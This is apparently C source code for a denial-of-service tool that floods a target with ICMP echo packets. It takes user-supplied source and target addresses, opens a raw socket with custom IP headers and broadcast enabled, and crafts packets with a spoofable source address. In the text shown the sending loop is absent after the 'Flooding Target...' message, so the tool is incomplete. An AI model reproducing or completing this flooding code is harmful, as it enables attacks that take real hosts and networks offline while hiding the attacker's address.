/**
 * DoS : Denial Of Service Attack
 * Accomplished via ICMP Flooding
 *
 * Orriginally Written By Silver Moon
 *
 * Version 2 Written By Josh Harshman (DeadDingo)
 * All Rights Reserved 12.21.2013
 *
 * ================================================
 * Version 2 Channel Log:
 *
 *  - Better Argument Parsing
 *  - 
 *
 * */

#include "packetsoup.h"


int main ( int argc, char *argv[ ] ) {

  unsigned long daddr;
  unsigned long saddr;
  int payload_size = 0, sent, sent_size, on, i;


  /*
  * Argument Parsing...*/

  if(argc < 3) {
    Usage();
  }

  for( i = 1; i < argc; i ++ ) {
    
    if(strncmp(argv[i], "-s", 2) == 0) {
      saddr = inet_addr(argv[i+1]);
    }
    if(strncmp(argv[i], "-d", 2) == 0) {
      daddr = inet_addr(argv[i+1]);
    }
    if(strncmp(argv[i], "-p", 2) == 0) {
      payload_size = atoi(argv[i+1]);
    }
  } //end for loop
  //end arg parsing


  //echo back arguments for testing
  /*
  printf("Source Address (saddr): %lu\n", saddr);
  printf("Destination Address (daddr) %lu\n", daddr);
  printf("Payload Size (payload_size) %d\n", payload_size);
  */

  //Get Raw Socket
  int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

  if(sockfd < 0) {
    perror("Could not create socket:");
    return 0;
  }

  puts("Socket Is Live!");

  //provide packet headers
  if( setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, (const char *)&on, sizeof(on)) == -1 ) {
    perror("setsockopt:");
    return 0;
  }

  //allow socket to send datagrams to broadcast addresses
  if( setsockopt(sockfd, SOL_SOCKET, SO_BROADCAST, (const char *)&on, sizeof(on)) == -1 ) {
    perror("setsockopt");
    return 0;
  }

  //calculate packet size
  //WARNING!!!
  //The Structs iphdr and icmphdr might not exist in Apple OSX
  //In order to maintain cross platform usability, utilize the makefile to do conditional preprocessing.
  int packet_size = sizeof(struct ip) + sizeof(struct icmp) + payload_size;
  char *packet = (char *)malloc(packet_size);

  if(!packet) {
    perror("No Memory");
    close(sockfd);
    return 0;
  }

  //ip header
  struct ip *iphdr = (struct ip *)packet;
  struct icmp *icmphdr = (struct icmp *) (packet + sizeof(struct ip));

  //zero the packet buffer
  memset(packet, 0, packet_size);
  
  //set member variables and whatnot
  iphdr->version = 4;
  iphdr->ihl = 5;
  iphdr->tos = 0;
  iphdr->tot_len = htons(packet_size);
  iphdr->id = rand();
  iphdr->frag_off = 0;
  iphdr->ttl = 255;
  iphdr->protocol = IPPROTO_ICMP;
  iphdr->saddr = saddr;
  iphdr->daddr = daddr;
  //
  
  icmphdr->icmp_type = ICMP_ECHO;
  icmphdr->icmp_code = 0;
  icmphdr->icmp_seq = rand();
  icmphdr->icmp_id = rand();
  icmphdr->icmp_cksum = 0;
  
  struct sockaddr_in servaddr;
  servaddr.sin_family = AF_INET;
  servaddr.sin_addr.s_addr = daddr;

  memset(&servaddr.sin_zero, 0, sizeof(servaddr.sin_zero));

  puts("Flooding Target...");

  

  return 0;
}
